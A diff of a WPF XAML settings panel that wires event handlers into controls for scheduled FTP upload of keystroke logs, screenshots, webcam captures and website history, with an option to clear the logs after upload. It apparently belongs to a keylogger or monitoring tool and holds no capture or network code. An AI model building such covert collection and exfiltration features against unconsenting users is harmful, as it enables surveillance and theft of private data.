@@ -18,13 +18,13 @@
         <StackPanel>
             <GroupBox Header="Enable/Disable" FontSize="15" Height="70" Padding="4" materialDesign:ColorZoneAssist.Mode="Light" Margin="0,0,10,0">
                 <StackPanel Orientation="Horizontal" Height="40">
-                    <CheckBox x:Name="cb_enable" Grid.ColumnSpan="3" FontSize="20">Try to upload logs by FTP every</CheckBox>
+                    <CheckBox x:Name="cb_enable" Grid.ColumnSpan="3" FontSize="20" Click="cb_enable_Click">Try to upload logs by FTP every</CheckBox>
                     <StackPanel Width="5"></StackPanel>
-                    <TextBox x:Name="tb_hours" Width="50" Height="35" VerticalAlignment="Top" FontSize="20" FlowDirection="RightToLeft" />
+                    <TextBox x:Name="tb_hours" Width="50" Height="35" VerticalAlignment="Top" FontSize="20" FlowDirection="RightToLeft" TextChanged="tb_hours_TextChanged" />
                     <StackPanel Width="5"></StackPanel>
                     <TextBlock Text="hours" VerticalAlignment="Center" FontSize="20"></TextBlock>
                     <StackPanel Width="5"></StackPanel>
-                    <TextBox x:Name="tb_minutes" Width="50" Height="35" FontSize="20" VerticalAlignment="Top" FlowDirection="RightToLeft" ></TextBox>
+                    <TextBox x:Name="tb_minutes" Width="50" Height="35" FontSize="20" VerticalAlignment="Top" FlowDirection="RightToLeft" TextChanged="tb_minutes_TextChanged" ></TextBox>
                     <StackPanel Width="5"></StackPanel>
                     <TextBlock Text="minutes" VerticalAlignment="Center" FontSize="20"></TextBlock>
                 </StackPanel>
@@ -39,10 +39,10 @@
                         <ColumnDefinition/>
                         <ColumnDefinition/>
                     </Grid.ColumnDefinitions>
-                    <CheckBox x:Name="cb_upKeystroke" FontSize="20">Text logs (keystroke)</CheckBox>
-                    <CheckBox x:Name="cb_upScrshot" FontSize="20" Grid.Column="1" >Visual logs (Image)</CheckBox>
-                    <CheckBox x:Name="cb_upWebcam" FontSize="20" Grid.Row="1">Webcam</CheckBox>
-                    <CheckBox x:Name="cb_upWebsite" FontSize="20" Grid.Column="1" Grid.Row="1">Website</CheckBox>
+                    <CheckBox x:Name="cb_upKeystroke" FontSize="20" Click="cb_upKeystroke_Click">Text logs (keystroke)</CheckBox>
+                    <CheckBox x:Name="cb_upScrshot" FontSize="20" Grid.Column="1" Click="cb_upScrshot_Click" >Visual logs (Image)</CheckBox>
+                    <CheckBox x:Name="cb_upWebcam" FontSize="20" Grid.Row="1" Click="cb_upWebcam_Click">Webcam</CheckBox>
+                    <CheckBox x:Name="cb_upWebsite" FontSize="20" Grid.Column="1" Grid.Row="1" Click="cb_upWebsite_Click">Website</CheckBox>
                 </Grid>
             </GroupBox>
             <GroupBox Header="Additional Option" FontSize="15" Height="116" Padding="4" materialDesign:ColorZoneAssist.Mode="Light" Margin="0,0,10,0">
@@ -53,17 +53,17 @@
                             <ColumnDefinition Width="0*"/>
                         </Grid.ColumnDefinitions>
                         <StackPanel Orientation="Horizontal" Height="40">
-                            <CheckBox x:Name="cb_limitedSize" FontSize="20">Upload only when the log size is more than</CheckBox>
+                            <CheckBox x:Name="cb_limitedSize" FontSize="20" Click="cb_limitedSize_Click">Upload only when the log size is more than</CheckBox>
                             <StackPanel Width="5"></StackPanel>
-                            <TextBox x:Name="tb_kbs" Height="30" VerticalAlignment="Top" FontSize="20" Width="50" FlowDirection="RightToLeft" ></TextBox>
+                            <TextBox x:Name="tb_kbs" Height="30" VerticalAlignment="Top" FontSize="20" Width="50" FlowDirection="RightToLeft" TextChanged="tb_kbs_TextChanged" ></TextBox>
                             <StackPanel Width="5"></StackPanel>
                             <TextBlock FontSize="20" Text="KBs" VerticalAlignment="Center"></TextBlock>
                         </StackPanel>
                     </Grid>
-                    <CheckBox x:Name="cb_clear" FontSize="20" Height="32">Clear the logs after successful uploading</CheckBox>
+                    <CheckBox x:Name="cb_clear" FontSize="20" Height="32" Click="cb_clear_Click">Clear the logs after successful uploading</CheckBox>
                 </StackPanel>
             </GroupBox>
         </StackPanel>
-        <Button HorizontalAlignment="Right" Width="160" Margin="0,310,24,31" Content="OK" Padding="0" Height="Auto" Click="Button_Click"/>
+        <Button x:Name="bt_OK" HorizontalAlignment="Right" Width="160" Margin="0,310,24,31" Content="OK" Padding="0" Height="Auto" Click="bt_OK_Click"/>
     </Grid>
 </UserControl>
